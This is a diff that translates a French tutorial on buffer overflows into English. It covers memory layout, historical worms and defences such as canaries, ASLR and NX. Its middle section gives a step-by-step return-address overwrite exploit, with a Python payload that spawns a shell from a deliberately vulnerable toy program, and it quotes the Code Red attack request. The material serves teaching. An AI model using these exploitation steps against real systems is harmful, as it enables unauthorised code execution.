@@ -1,567 +1,567 @@
-# **Buffer Overflow : Comprendre, Exploiter et Prévenir les Vulnérabilités Mémoire**
+# **Buffer Overflow: Understanding, Exploiting, and Preventing Memory Vulnerabilities**
 
 ![Buffer Overflow Diagram](https://www.imperva.com/learn/wp-content/uploads/sites/13/2018/01/buffer-overflow.png)
 
-*Représentation d'un débordement de tampon écrasant la mémoire adjacente*
+*Representation of a buffer overflow overwriting adjacent memory*
 
 ---
 
 ## Introduction
 
-Dans le monde de la cybersécurité, certaines vulnérabilités ont marqué l'histoire par leur impact dévastateur. Parmi elles, le **buffer overflow** (débordement de tampon) reste l'une des failles les plus dangereuses et les plus exploitées depuis plus de 30 ans. Malgré les avancées technologiques et les mécanismes de protection modernes, cette vulnérabilité continue de menacer nos systèmes informatiques.
+In the world of cybersecurity, certain vulnerabilities have made history through their devastating impact. Among them, **buffer overflow** remains one of the most dangerous and most exploited flaws for over 30 years. Despite technological advances and modern protection mechanisms, this vulnerability continues to threaten our computer systems.
 
-Dans cet article, nous allons explorer en profondeur ce qu'est un buffer overflow, comment il fonctionne, comment les attaquants l'exploitent, et surtout comment s'en protéger.
+In this article, we will explore in depth what a buffer overflow is, how it works, how attackers exploit it, and most importantly how to protect against it.
 
 ---
 
-## 1. Qu'est-ce qu'un Buffer Overflow ?
+## 1. What is a Buffer Overflow?
 
-### Définition d'un Buffer (Tampon)
+### Definition of a Buffer
 
-Un **buffer** (ou tampon en français) est une zone de mémoire temporaire utilisée par un programme pour stocker des données pendant leur traitement. Pensez-y comme une boîte de rangement avec une capacité limitée : elle ne peut contenir qu'une certaine quantité d'éléments.
+A **buffer** is a temporary memory area used by a program to store data during processing. Think of it as a storage box with limited capacity: it can only hold a certain amount of items.
 
 ```c
-char buffer[64];  // Un tampon pouvant contenir 64 caractères
+char buffer[64];  // A buffer that can hold 64 characters
 ```
 
-### Définition du Buffer Overflow
+### Definition of Buffer Overflow
 
-Un **buffer overflow** se produit lorsqu'un programme tente d'écrire plus de données dans un tampon qu'il ne peut en contenir. Les données excédentaires "débordent" alors dans les zones mémoire adjacentes, écrasant potentiellement des informations critiques.
+A **buffer overflow** occurs when a program attempts to write more data into a buffer than it can hold. The excess data "overflows" into adjacent memory areas, potentially overwriting critical information.
 
-**Analogie simple :** Imaginez que vous versez 2 litres d'eau dans un verre d'1 litre. L'eau excédentaire va déborder et se répandre partout autour du verre. C'est exactement ce qui se passe en mémoire lors d'un buffer overflow.
+**Simple analogy:** Imagine pouring 2 liters of water into a 1-liter glass. The excess water will overflow and spill everywhere around the glass. This is exactly what happens in memory during a buffer overflow.
 
-### Importance en Sécurité Informatique
+### Importance in Computer Security
 
-Le buffer overflow est considéré comme l'une des vulnérabilités les plus critiques car il peut permettre à un attaquant de :
+Buffer overflow is considered one of the most critical vulnerabilities because it can allow an attacker to:
 
-| Conséquence | Description |
+| Consequence | Description |
 |-------------|-------------|
-| **Exécution de code arbitraire** | L'attaquant peut faire exécuter son propre code malveillant |
-| **Élévation de privilèges** | Obtenir des droits administrateur sur le système |
-| **Déni de service (DoS)** | Faire planter le programme ou le système entier |
-| **Vol de données** | Accéder à des informations sensibles en mémoire |
-| **Prise de contrôle totale** | Compromettre entièrement le système cible |
+| **Arbitrary code execution** | The attacker can execute their own malicious code |
+| **Privilege escalation** | Obtain administrator rights on the system |
+| **Denial of Service (DoS)** | Crash the program or the entire system |
+| **Data theft** | Access sensitive information in memory |
+| **Complete takeover** | Fully compromise the target system |
 
 ---
 
-## 2. Comment se Produisent les Buffer Overflows ?
+## 2. How Do Buffer Overflows Occur?
 
-### Organisation de la Mémoire
+### Memory Organization
 
-Pour comprendre les buffer overflows, il faut d'abord comprendre comment un programme organise sa mémoire. Voici la structure typique :
+To understand buffer overflows, you must first understand how a program organizes its memory. Here is the typical structure:
 
 ```
-┌─────────────────────────┐  Adresses hautes (0xFFFFFFFF)
+┌─────────────────────────┐  High addresses (0xFFFFFFFF)
 │                         │
-│         STACK           │  ← Variables locales, adresses de retour
-│           ↓             │    (grandit vers le bas)
+│         STACK           │  ← Local variables, return addresses
+│           ↓             │    (grows downward)
 │                         │
 ├─────────────────────────┤
 │                         │
-│    (espace libre)       │
+│    (free space)         │
 │                         │
 ├─────────────────────────┤
 │           ↑             │
-│          HEAP           │  ← Mémoire allouée dynamiquement
-│                         │    (grandit vers le haut)
+│          HEAP           │  ← Dynamically allocated memory
+│                         │    (grows upward)
 ├─────────────────────────┤
-│          BSS            │  ← Variables globales non initialisées
+│          BSS            │  ← Uninitialized global variables
 ├─────────────────────────┤
-│          DATA           │  ← Variables globales initialisées
+│          DATA           │  ← Initialized global variables
 ├─────────────────────────┤
-│          TEXT           │  ← Code du programme (instructions)
-└─────────────────────────┘  Adresses basses (0x00000000)
+│          TEXT           │  ← Program code (instructions)
+└─────────────────────────┘  Low addresses (0x00000000)
 ```
 
-### La Stack (Pile) en Détail
+### The Stack in Detail
 
-La **stack** est particulièrement importante car c'est là que se trouvent :
-- Les **variables locales** des fonctions
-- Les **adresses de retour** (où le programme doit continuer après une fonction)
-- Les **pointeurs de frame** (EBP/RBP)
+The **stack** is particularly important because it contains:
+- **Local variables** of functions
+- **Return addresses** (where the program should continue after a function)
+- **Frame pointers** (EBP/RBP)
 
 ```
-Lors d'un appel de fonction :
+During a function call:
 
 ┌─────────────────────────┐
-│    Adresse de retour    │  ← Où retourner après la fonction
+│    Return address       │  ← Where to return after the function
 ├─────────────────────────┤
-│    EBP sauvegardé       │  ← Pointeur de frame précédent
+│    Saved EBP            │  ← Previous frame pointer
 ├─────────────────────────┤
 │                         │
-│    Variables locales    │  ← Inclut nos buffers !
+│    Local variables      │  ← Includes our buffers!
 │    (buffer[64])         │
 │                         │
 └─────────────────────────┘
 ```
 
-### Le Mécanisme du Débordement
+### The Overflow Mechanism
 
-Quand un programme utilise des fonctions non sécurisées comme `strcpy()`, `gets()`, ou `sprintf()` sans vérifier la taille des données, voici ce qui peut arriver :
+When a program uses unsafe functions like `strcpy()`, `gets()`, or `sprintf()` without checking data size, here's what can happen:
 
-**Avant le débordement :**
+**Before the overflow:**
 ```
 ┌─────────────────────────┐
-│  Adresse de retour      │  → 0x08048456 (adresse légitime)
+│  Return address         │  → 0x08048456 (legitimate address)
 │  = 0x08048456           │
 ├─────────────────────────┤
-│  EBP sauvegardé         │  → Valeur correcte
+│  Saved EBP              │  → Correct value
 ├─────────────────────────┤
-│  buffer[64]             │  → "Hello" (5 caractères)
+│  buffer[64]             │  → "Hello" (5 characters)
 │  "Hello\0"              │
 │  ...                    │
-│  (espace vide)          │
+│  (empty space)          │
 └─────────────────────────┘
 ```
 
-**Après le débordement (100 caractères envoyés) :**
+**After the overflow (100 characters sent):**
 ```
 ┌─────────────────────────┐
-│  Adresse de retour      │  → 0x41414141 (AAAA) ÉCRASÉE !
+│  Return address         │  → 0x41414141 (AAAA) OVERWRITTEN!
 │  = 0x41414141           │
 ├─────────────────────────┤
-│  EBP sauvegardé         │  → 0x41414141 ÉCRASÉ !
+│  Saved EBP              │  → 0x41414141 OVERWRITTEN!
 ├─────────────────────────┤
 │  buffer[64]             │  → "AAAAAAAAAAAAAAAAA..."
-│  "AAAAAAAAAAAAA"        │     Données qui débordent
+│  "AAAAAAAAAAAAA"        │     Overflowing data
 │  "AAAAAAAAAAAAA"        │
 │  "AAAAAAAAAAAAA"        │
 └─────────────────────────┘
 ```
 
-### Fonctions Dangereuses en C
+### Dangerous Functions in C
 
-Voici les fonctions les plus couramment exploitées :
+Here are the most commonly exploited functions:
 
-| Fonction dangereuse | Problème | Alternative sécurisée |
-|---------------------|----------|----------------------|
-| `gets()` | Aucune limite de taille | `fgets()` |
-| `strcpy()` | Ne vérifie pas la taille | `strncpy()`, `strlcpy()` |
-| `strcat()` | Ne vérifie pas l'espace restant | `strncat()`, `strlcat()` |
-| `sprintf()` | Peut dépasser le buffer | `snprintf()` |
-| `scanf("%s")` | Pas de limite | `scanf("%63s")` |
+| Dangerous function | Problem | Safe alternative |
+|--------------------|---------|------------------|
+| `gets()` | No size limit | `fgets()` |
+| `strcpy()` | Doesn't check size | `strncpy()`, `strlcpy()` |
+| `strcat()` | Doesn't check remaining space | `strncat()`, `strlcat()` |
+| `sprintf()` | Can overflow buffer | `snprintf()` |
+| `scanf("%s")` | No limit | `scanf("%63s")` |
 
 ---
 
-## 3. Exemple Simplifié d'Exploitation
+## 3. Simplified Exploitation Example
 
-### Code Vulnérable
+### Vulnerable Code
 
-Voici un programme C contenant une vulnérabilité de buffer overflow :
+Here is a C program containing a buffer overflow vulnerability:
 
 ```c
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-void fonction_secrete() {
-    printf("🎉 ACCÈS ACCORDÉ ! Vous avez hacké le système !\n");
-    printf("Vous avez maintenant les droits administrateur.\n");
-    system("/bin/sh");  // Ouvre un shell
+void secret_function() {
+    printf("🎉 ACCESS GRANTED! You have hacked the system!\n");
+    printf("You now have administrator rights.\n");
+    system("/bin/sh");  // Opens a shell
 }
 
-void fonction_vulnerable(char *input) {
-    char buffer[64];  // Seulement 64 octets alloués
+void vulnerable_function(char *input) {
+    char buffer[64];  // Only 64 bytes allocated
     
-    printf("Données reçues, traitement en cours...\n");
-    strcpy(buffer, input);  // DANGER : Pas de vérification de taille !
-    printf("Vous avez entré : %s\n", buffer);
+    printf("Data received, processing...\n");
+    strcpy(buffer, input);  // DANGER: No size verification!
+    printf("You entered: %s\n", buffer);
 }
 
 int main(int argc, char *argv[]) {
     if (argc < 2) {
-        printf("Usage: %s <votre_message>\n", argv[0]);
+        printf("Usage: %s <your_message>\n", argv[0]);
         return 1;
     }
     
-    printf("=== Programme de traitement de messages ===\n");
-    fonction_vulnerable(argv[1]);
-    printf("Merci d'avoir utilisé notre programme !\n");
+    printf("=== Message Processing Program ===\n");
+    vulnerable_function(argv[1]);
+    printf("Thank you for using our program!\n");
     
     return 0;
 }
 ```
 
-### Étapes de l'Exploitation
+### Exploitation Steps
 
-**Étape 1 : Identifier la vulnérabilité**
+**Step 1: Identify the vulnerability**
 
-L'attaquant remarque que `strcpy()` est utilisé sans vérification. Le buffer fait 64 octets, mais l'entrée utilisateur n'est pas limitée.
+The attacker notices that `strcpy()` is used without verification. The buffer is 64 bytes, but user input is not limited.
 
-**Étape 2 : Déterminer la taille du buffer**
+**Step 2: Determine the buffer size**
 
-L'attaquant envoie des données croissantes pour trouver à quel moment le programme plante :
-
-```bash
-./programme $(python3 -c "print('A' * 64)")   # OK
-./programme $(python3 -c "print('A' * 70)")   # OK
-./programme $(python3 -c "print('A' * 80)")   # Crash ! Segmentation fault
-```
-
-**Étape 3 : Localiser l'adresse de retour**
-
-En utilisant un pattern unique, l'attaquant détermine exactement où se trouve l'adresse de retour :
+The attacker sends increasing data to find when the program crashes:
 
 ```bash
-# Après 72 octets, on écrase l'adresse de retour
-# buffer (64) + EBP sauvegardé (8) = 72 octets avant l'adresse de retour
+./program $(python3 -c "print('A' * 64)")   # OK
+./program $(python3 -c "print('A' * 70)")   # OK
+./program $(python3 -c "print('A' * 80)")   # Crash! Segmentation fault
 ```
 
-**Étape 4 : Trouver l'adresse de la fonction cible**
+**Step 3: Locate the return address**
+
+Using a unique pattern, the attacker determines exactly where the return address is located:
 
 ```bash
-$ objdump -d programme | grep fonction_secrete
-0000000000401156 <fonction_secrete>:
+# After 72 bytes, we overwrite the return address
+# buffer (64) + saved EBP (8) = 72 bytes before the return address
 ```
 
-L'adresse de `fonction_secrete` est `0x401156`.
+**Step 4: Find the target function address**
 
-**Étape 5 : Construire le payload (charge utile)**
+```bash
+$ objdump -d program | grep secret_function
+0000000000401156 <secret_function>:
+```
+
+The address of `secret_function` is `0x401156`.
+
+**Step 5: Build the payload**
 
 ```python
 #!/usr/bin/python3
 import struct
 
-# Remplissage pour atteindre l'adresse de retour
+# Padding to reach the return address
 padding = b'A' * 72
 
-# Adresse de fonction_secrete en little-endian
-adresse_cible = struct.pack("<Q", 0x401156)
+# Address of secret_function in little-endian
+target_address = struct.pack("<Q", 0x401156)
 
-# Payload final
-payload = padding + adresse_cible
+# Final payload
+payload = padding + target_address
 
 print(payload)
 ```
 
-**Étape 6 : Exécuter l'attaque**
+**Step 6: Execute the attack**
 
 ```bash
-./programme $(python3 exploit.py)
+./program $(python3 exploit.py)
 ```
 
-**Résultat :**
+**Result:**
 ```
-=== Programme de traitement de messages ===
-Données reçues, traitement en cours...
-Vous avez entré : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
-🎉 ACCÈS ACCORDÉ ! Vous avez hacké le système !
-Vous avez maintenant les droits administrateur.
-$   # Shell obtenu !
+=== Message Processing Program ===
+Data received, processing...
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+🎉 ACCESS GRANTED! You have hacked the system!
+You now have administrator rights.
+$   # Shell obtained!
 ```
 
-### Schéma de l'Attaque
+### Attack Diagram
 
 ```
-AVANT L'ATTAQUE :
+BEFORE THE ATTACK:
 ┌──────────────────┐
-│ Ret: 0x401234    │ → Retourne normalement à main()
+│ Ret: 0x401234    │ → Returns normally to main()
 ├──────────────────┤
-│ EBP sauvegardé   │
+│ Saved EBP        │
 ├──────────────────┤
-│ buffer[64]       │ → Entrée normale
+│ buffer[64]       │ → Normal input
 └──────────────────┘
 
-APRÈS L'ATTAQUE :
+AFTER THE ATTACK:
 ┌──────────────────┐
-│ Ret: 0x401156    │ → Redirigé vers fonction_secrete() !
+│ Ret: 0x401156    │ → Redirected to secret_function()!
 ├──────────────────┤
-│ AAAAAAAA         │ → EBP écrasé
+│ AAAAAAAA         │ → EBP overwritten
 ├──────────────────┤
-│ AAAAAAAAAAAAA    │ → Buffer rempli de 'A'
+│ AAAAAAAAAAAAA    │ → Buffer filled with 'A'
 │ AAAAAAAAAAAAA    │
 └──────────────────┘
 ```
 
 ---
 
-## 4. Exemples Historiques d'Attaques par Buffer Overflow
+## 4. Historical Examples of Buffer Overflow Attacks
 
-### Le Morris Worm (1988) - Le Premier Ver Internet
+### The Morris Worm (1988) - The First Internet Worm
 
-**Contexte :**
-Le 2 novembre 1988, Robert Tappan Morris, un étudiant de 23 ans à Cornell University, a lancé ce qui allait devenir le premier ver informatique majeur de l'histoire d'Internet.
+**Context:**
+On November 2, 1988, Robert Tappan Morris, a 23-year-old student at Cornell University, launched what would become the first major computer worm in Internet history.
 
-**Vulnérabilité exploitée :**
-Le ver exploitait un buffer overflow dans le démon `fingerd` sur les systèmes Unix. La fonction `gets()` était utilisée pour lire l'entrée utilisateur sans aucune vérification de taille.
+**Exploited vulnerability:**
+The worm exploited a buffer overflow in the `fingerd` daemon on Unix systems. The `gets()` function was used to read user input without any size verification.
 
 ```c
-/* Code vulnérable de fingerd */
+/* Vulnerable fingerd code */
 char buffer[512];
-gets(buffer);  /* DANGEREUX : aucune limite ! */
+gets(buffer);  /* DANGEROUS: no limit! */
 ```
 
-**Impact :**
-- **6 000 machines infectées** (environ 10% de l'Internet de l'époque)
-- **Dommages estimés entre 100 000 $ et 10 millions $**
-- Paralysie de nombreuses universités et institutions gouvernementales
-- Première condamnation sous le Computer Fraud and Abuse Act
+**Impact:**
+- **6,000 machines infected** (approximately 10% of the Internet at the time)
+- **Estimated damages between $100,000 and $10 million**
+- Paralysis of many universities and government institutions
+- First conviction under the Computer Fraud and Abuse Act
 
-**Conséquences positives :**
-- Création du **CERT** (Computer Emergency Response Team)
-- Prise de conscience mondiale de la sécurité informatique
+**Positive consequences:**
+- Creation of **CERT** (Computer Emergency Response Team)
+- Worldwide awareness of computer security
 
 ---
 
-### Code Red (2001) - L'Attaque des Serveurs Web
+### Code Red (2001) - The Web Server Attack
 
-**Contexte :**
-En juillet 2001, le ver Code Red a exploité une vulnérabilité de buffer overflow dans le serveur web Microsoft IIS (Internet Information Services).
+**Context:**
+In July 2001, the Code Red worm exploited a buffer overflow vulnerability in Microsoft IIS (Internet Information Services) web server.
 
-**Vulnérabilité exploitée :**
-Un buffer overflow dans le traitement des requêtes `.ida` permettait l'exécution de code arbitraire.
+**Exploited vulnerability:**
+A buffer overflow in the processing of `.ida` requests allowed arbitrary code execution.
 
 ```
 GET /default.ida?NNNNNNNN...NNNN(shellcode) HTTP/1.0
 ```
 
-**Impact :**
-- **359 000 serveurs infectés** en moins de 14 heures
-- Propagation exponentielle : doublait toutes les 37 minutes
-- **Dommages estimés à 2,6 milliards de dollars**
-- Défacement de sites web avec le message : *"Hacked by Chinese!"*
-- Attaque DDoS planifiée contre la Maison Blanche
+**Impact:**
+- **359,000 servers infected** in less than 14 hours
+- Exponential propagation: doubled every 37 minutes
+- **Estimated damages of $2.6 billion**
+- Website defacement with the message: *"Hacked by Chinese!"*
+- Planned DDoS attack against the White House
 
-**Timeline de l'infection :**
+**Infection timeline:**
 ```
-Heure 0  : 1 machine infectée
-Heure 1  : 4 machines
-Heure 2  : 16 machines
-Heure 6  : 4 096 machines
-Heure 10 : 65 536 machines
-Heure 14 : 359 000 machines
+Hour 0  : 1 machine infected
+Hour 1  : 4 machines
+Hour 2  : 16 machines
+Hour 6  : 4,096 machines
+Hour 10 : 65,536 machines
+Hour 14 : 359,000 machines
 ```
 
 ---
 
-### SQL Slammer (2003) - Le Ver le Plus Rapide
+### SQL Slammer (2003) - The Fastest Worm
 
-**Contexte :**
-Le 25 janvier 2003, SQL Slammer a exploité un buffer overflow dans Microsoft SQL Server 2000, devenant le ver à propagation la plus rapide jamais observé.
+**Context:**
+On January 25, 2003, SQL Slammer exploited a buffer overflow in Microsoft SQL Server 2000, becoming the fastest-spreading worm ever observed.
 
-**Caractéristiques techniques :**
-- Payload de seulement **376 octets**
-- Utilisait UDP (pas besoin de connexion établie)
-- Se propageait via le port 1434
+**Technical characteristics:**
+- Payload of only **376 bytes**
+- Used UDP (no established connection needed)
+- Spread via port 1434
 
-**Impact :**
-- **75 000 victimes en 10 minutes**
-- Doublait de taille toutes les **8,5 secondes**
-- A saturé la bande passante mondiale
-- Perturbations majeures :
-  - Distributeurs automatiques Bank of America hors service
-  - Services d'urgence 911 perturbés à Seattle
-  - Retards de vols Continental Airlines
+**Impact:**
+- **75,000 victims in 10 minutes**
+- Doubled in size every **8.5 seconds**
+- Saturated worldwide bandwidth
+- Major disruptions:
+  - Bank of America ATMs out of service
+  - 911 emergency services disrupted in Seattle
+  - Continental Airlines flight delays
 
 ---
 
-### Heartbleed (2014) - La Faille qui a Ébranlé Internet
+### Heartbleed (2014) - The Flaw that Shook the Internet
 
-**Contexte :**
-Heartbleed (CVE-2014-0160) était une vulnérabilité dans l'implémentation OpenSSL du protocole TLS Heartbeat. Bien que techniquement un **buffer over-read** (lecture au-delà du buffer) plutôt qu'un overflow classique, son impact a été dévastateur.
+**Context:**
+Heartbleed (CVE-2014-0160) was a vulnerability in the OpenSSL implementation of the TLS Heartbeat protocol. Although technically a **buffer over-read** (reading beyond the buffer) rather than a classic overflow, its impact was devastating.
 
-**Vulnérabilité exploitée :**
-Le protocole Heartbeat permettait de demander une réponse avec une longueur spécifiée par l'utilisateur, mais cette longueur n'était pas vérifiée.
+**Exploited vulnerability:**
+The Heartbeat protocol allowed requesting a response with a user-specified length, but this length was not verified.
 
 ```c
-/* Code vulnérable simplifié */
-/* L'utilisateur envoie : longueur = 65535, mais données = "BIRD" (4 octets) */
+/* Simplified vulnerable code */
+/* User sends: length = 65535, but data = "BIRD" (4 bytes) */
 
 memcpy(response, payload_data, payload_length);
-/* Copie 65535 octets alors que seulement 4 ont été envoyés */
-/* Les 65531 octets restants viennent de la mémoire adjacente ! */
+/* Copies 65535 bytes when only 4 were sent */
+/* The remaining 65531 bytes come from adjacent memory! */
 ```
 
-**Requête malveillante :**
+**Malicious request:**
 ```
-Client : "Répète-moi le mot 'BIRD' (4 lettres) sur 65535 caractères"
-Serveur : "BIRD" + 65531 caractères de mémoire sensible
+Client: "Repeat the word 'BIRD' (4 letters) over 65535 characters"
+Server: "BIRD" + 65531 characters of sensitive memory
 ```
 
-**Impact :**
-- **17% des serveurs web sécurisés** affectés (500 000+ serveurs)
-- Données exposées :
-  - Clés privées SSL
-  - Identifiants utilisateurs
-  - Cookies de session
-  - Données sensibles en mémoire
-- Vulnérabilité présente pendant **2 ans** avant sa découverte
-- Nécessité de régénérer des millions de certificats SSL
+**Impact:**
+- **17% of secure web servers** affected (500,000+ servers)
+- Exposed data:
+  - SSL private keys
+  - User credentials
+  - Session cookies
+  - Sensitive data in memory
+- Vulnerability present for **2 years** before discovery
+- Need to regenerate millions of SSL certificates
 
 ---
 
-### Tableau Récapitulatif
+### Summary Table
 
-| Attaque | Année | Vulnérabilité | Victimes | Dommages |
-|---------|-------|---------------|----------|----------|
-| **Morris Worm** | 1988 | `gets()` dans fingerd | 6 000 | $10M+ |
-| **Code Red** | 2001 | IIS .ida handler | 359 000 | $2.6B |
-| **SQL Slammer** | 2003 | SQL Server 2000 | 75 000+ | $1B+ |
-| **Heartbleed** | 2014 | OpenSSL Heartbeat | 500 000+ | Incalculable |
+| Attack | Year | Vulnerability | Victims | Damages |
+|--------|------|---------------|---------|---------|
+| **Morris Worm** | 1988 | `gets()` in fingerd | 6,000 | $10M+ |
+| **Code Red** | 2001 | IIS .ida handler | 359,000 | $2.6B |
+| **SQL Slammer** | 2003 | SQL Server 2000 | 75,000+ | $1B+ |
+| **Heartbleed** | 2014 | OpenSSL Heartbeat | 500,000+ | Incalculable |
 
 ---
 
-## 5. Comment Prévenir et Atténuer les Buffer Overflows
+## 5. How to Prevent and Mitigate Buffer Overflows
 
-### 5.1 Pratiques de Programmation Sécurisée
+### 5.1 Secure Programming Practices
 
-#### Utiliser des Fonctions Sécurisées
+#### Use Safe Functions
 
 ```c
-/* ❌ DANGEREUX */
+/* ❌ DANGEROUS */
 char buffer[64];
-gets(buffer);                    // Jamais de limite
-strcpy(buffer, source);          // Pas de vérification
-sprintf(buffer, "%s", data);     // Peut déborder
+gets(buffer);                    // Never any limit
+strcpy(buffer, source);          // No verification
+sprintf(buffer, "%s", data);     // Can overflow
 
-/* ✅ SÉCURISÉ */
+/* ✅ SAFE */
 char buffer[64];
-fgets(buffer, sizeof(buffer), stdin);           // Limite respectée
-strncpy(buffer, source, sizeof(buffer) - 1);    // Taille limitée
-buffer[sizeof(buffer) - 1] = '\0';              // Null-terminator garanti
-snprintf(buffer, sizeof(buffer), "%s", data);   // Taille limitée
+fgets(buffer, sizeof(buffer), stdin);           // Limit respected
+strncpy(buffer, source, sizeof(buffer) - 1);    // Size limited
+buffer[sizeof(buffer) - 1] = '\0';              // Null-terminator guaranteed
+snprintf(buffer, sizeof(buffer), "%s", data);   // Size limited
 ```
 
-#### Toujours Valider les Entrées
+#### Always Validate Inputs
 
 ```c
-/* Vérifier la taille avant de copier */
-void traiter_donnees(char *input) {
+/* Check size before copying */
+void process_data(char *input) {
     char buffer[64];
     
     size_t input_len = strlen(input);
     if (input_len >= sizeof(buffer)) {
-        fprintf(stderr, "Erreur : entrée trop longue !\n");
+        fprintf(stderr, "Error: input too long!\n");
         return;
     }
     
-    strcpy(buffer, input);  // Maintenant sécurisé
+    strcpy(buffer, input);  // Now safe
 }
 ```
 
-### 5.2 Protections du Compilateur
+### 5.2 Compiler Protections
 
-#### Stack Canaries (Canaris de Pile)
+#### Stack Canaries
 
-Les canaris sont des valeurs aléatoires placées entre le buffer et l'adresse de retour. Si le canari est modifié, le programme se termine immédiatement.
+Canaries are random values placed between the buffer and the return address. If the canary is modified, the program terminates immediately.
 
 ```
 ┌─────────────────────┐
-│  Adresse de retour  │
+│  Return address     │
 ├─────────────────────┤
-│  🐤 CANARI 🐤       │  ← Valeur aléatoire vérifiée
+│  🐤 CANARY 🐤       │  ← Random value checked
 ├─────────────────────┤
 │  buffer[64]         │
 └─────────────────────┘
 ```
 
-**Activation :**
+**Activation:**
 ```bash
-gcc -fstack-protector-all programme.c -o programme
+gcc -fstack-protector-all program.c -o program
 ```
 
 #### ASLR (Address Space Layout Randomization)
 
-L'ASLR randomise les adresses mémoire à chaque exécution, rendant difficile la prédiction des adresses cibles.
+ASLR randomizes memory addresses at each execution, making it difficult to predict target addresses.
 
 ```bash
-# Vérifier si ASLR est activé
+# Check if ASLR is enabled
 cat /proc/sys/kernel/randomize_va_space
-# 0 = Désactivé
-# 1 = Partiellement activé
-# 2 = Complètement activé (recommandé)
+# 0 = Disabled
+# 1 = Partially enabled
+# 2 = Fully enabled (recommended)
 
-# Activer ASLR
+# Enable ASLR
 echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
-**Sans ASLR :**
+**Without ASLR:**
 ```
-Exécution 1 : buffer à 0x7fffffffe000
-Exécution 2 : buffer à 0x7fffffffe000  (même adresse)
-Exécution 3 : buffer à 0x7fffffffe000  (même adresse)
+Execution 1: buffer at 0x7fffffffe000
+Execution 2: buffer at 0x7fffffffe000  (same address)
+Execution 3: buffer at 0x7fffffffe000  (same address)
 ```
 
-**Avec ASLR :**
+**With ASLR:**
 ```
-Exécution 1 : buffer à 0x7fff5a3be000
-Exécution 2 : buffer à 0x7fff2c8f1000  (adresse différente)
-Exécution 3 : buffer à 0x7fff8e12d000  (adresse différente)
+Execution 1: buffer at 0x7fff5a3be000
+Execution 2: buffer at 0x7fff2c8f1000  (different address)
+Execution 3: buffer at 0x7fff8e12d000  (different address)
 ```
 
 #### DEP/NX (Data Execution Prevention / No-Execute)
 
-Marque certaines zones mémoire comme non-exécutables. Même si un attaquant injecte du shellcode, il ne pourra pas l'exécuter.
+Marks certain memory areas as non-executable. Even if an attacker injects shellcode, they won't be able to execute it.
 
 ```bash
-# Compiler avec NX activé
-gcc -z noexecstack programme.c -o programme
+# Compile with NX enabled
+gcc -z noexecstack program.c -o program
 
-# Vérifier si NX est activé
-readelf -l programme | grep GNU_STACK
-# RW = NX activé (pas d'exécution)
-# RWE = NX désactivé (exécution possible)
+# Check if NX is enabled
+readelf -l program | grep GNU_STACK
+# RW = NX enabled (no execution)
+# RWE = NX disabled (execution possible)
 ```
 
-### 5.3 Utiliser des Langages Sécurisés
+### 5.3 Use Safe Languages
 
-Certains langages modernes empêchent les buffer overflows par conception :
+Some modern languages prevent buffer overflows by design:
 
-| Langage | Mécanisme de Protection |
-|---------|------------------------|
-| **Rust** | Système de propriété, vérification à la compilation |
-| **Go** | Vérification des limites automatique |
-| **Python** | Gestion automatique de la mémoire |
-| **Java** | Machine virtuelle avec vérification des bornes |
-| **C#** | Code managé avec vérifications |
+| Language | Protection Mechanism |
+|----------|---------------------|
+| **Rust** | Ownership system, compile-time verification |
+| **Go** | Automatic bounds checking |
+| **Python** | Automatic memory management |
+| **Java** | Virtual machine with bounds checking |
+| **C#** | Managed code with verifications |
 
-**Exemple en Rust (sécurisé par défaut) :**
+**Example in Rust (safe by default):**
 ```rust
 fn main() {
     let buffer: [u8; 64] = [0; 64];
     
-    // Cette ligne ne compilera pas !
-    // buffer[100] = 65;  // Erreur : index hors limites
+    // This line will not compile!
+    // buffer[100] = 65;  // Error: index out of bounds
 }
 ```
 
-### 5.4 Outils de Détection
+### 5.4 Detection Tools
 
-| Outil | Type | Utilisation |
-|-------|------|-------------|
-| **Valgrind** | Dynamique | Détecte les erreurs mémoire à l'exécution |
-| **AddressSanitizer** | Dynamique | Compilateur avec détection d'erreurs |
-| **Coverity** | Statique | Analyse le code source |
-| **Cppcheck** | Statique | Analyse statique pour C/C++ |
-| **Fuzzing (AFL)** | Dynamique | Test avec entrées aléatoires |
+| Tool | Type | Usage |
+|------|------|-------|
+| **Valgrind** | Dynamic | Detects memory errors at runtime |
+| **AddressSanitizer** | Dynamic | Compiler with error detection |
+| **Coverity** | Static | Analyzes source code |
+| **Cppcheck** | Static | Static analysis for C/C++ |
+| **Fuzzing (AFL)** | Dynamic | Testing with random inputs |
 
-**Utilisation d'AddressSanitizer :**
+**Using AddressSanitizer:**
 ```bash
-gcc -fsanitize=address -g programme.c -o programme
-./programme
-# Affichera des détails précis sur tout débordement détecté
+gcc -fsanitize=address -g program.c -o program
+./program
+# Will display precise details about any detected overflow
 ```
 
-### 5.5 Défense en Profondeur
+### 5.5 Defense in Depth
 
 ```
 ┌─────────────────────────────────────────────────────┐
-│                 DÉFENSE EN PROFONDEUR               │
+│                 DEFENSE IN DEPTH                    │
 ├─────────────────────────────────────────────────────┤
-│  Couche 1 : Programmation sécurisée                 │
-│  └── Fonctions sécurisées, validation des entrées  │
+│  Layer 1: Secure programming                        │
+│  └── Safe functions, input validation               │
 ├─────────────────────────────────────────────────────┤
-│  Couche 2 : Protections du compilateur              │
+│  Layer 2: Compiler protections                      │
 │  └── Stack canaries, fortification                  │
 ├─────────────────────────────────────────────────────┤
-│  Couche 3 : Protections du système                  │
+│  Layer 3: System protections                        │
 │  └── ASLR, DEP/NX, sandboxing                       │
 ├─────────────────────────────────────────────────────┤
-│  Couche 4 : Surveillance et détection               │
+│  Layer 4: Monitoring and detection                  │
 │  └── IDS/IPS, logging, monitoring                   │
 ├─────────────────────────────────────────────────────┤
-│  Couche 5 : Réponse aux incidents                   │
-│  └── Patches, mises à jour, forensics               │
+│  Layer 5: Incident response                         │
+│  └── Patches, updates, forensics                    │
 └─────────────────────────────────────────────────────┘
 ```
 
@@ -569,20 +569,20 @@ gcc -fsanitize=address -g programme.c -o programme
 
 ## Conclusion
 
-Les buffer overflows restent une menace majeure en cybersécurité, malgré plus de trois décennies de sensibilisation. Ces vulnérabilités ont causé certaines des attaques les plus dévastatrices de l'histoire informatique, du Morris Worm en 1988 à Heartbleed en 2014.
+Buffer overflows remain a major threat in cybersecurity, despite more than three decades of awareness. These vulnerabilities have caused some of the most devastating attacks in computer history, from the Morris Worm in 1988 to Heartbleed in 2014.
 
